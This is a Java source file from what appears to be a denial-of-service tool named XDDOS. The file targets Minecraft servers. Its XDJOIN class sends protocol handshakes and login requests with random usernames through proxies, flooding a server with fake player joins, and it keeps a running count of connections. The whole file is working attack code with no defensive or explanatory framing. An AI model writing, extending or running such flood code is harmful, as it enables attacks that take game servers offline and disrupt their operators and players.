package XD.XDDOS.methods.impl;

import java.security.SecureRandom;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;


public class XDJOIN implements IMethod {
    private final Handshake handshake;
    private final byte[] bytes;


    public XDJOIN() {
        this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
        this.bytes = this.handshake.getWrappedPacket();
    }

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
        // Generating a random string of alphabets
        String randomString = generateRandomAlphabetString(8); // Change 8 to the desired length of the string
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomString + "_PAL")).getWrappedPacket()));
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
    }

    // Method to generate a random string of alphabets
    private String generateRandomAlphabetString(int length) {
        String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder sb = new StringBuilder();
        SecureRandom random = new SecureRandom();
        for (int i = 0; i < length; i++) {
            int index = random.nextInt(alphabet.length());
            sb.append(alphabet.charAt(index));
        }
        return sb.toString();
    }
}
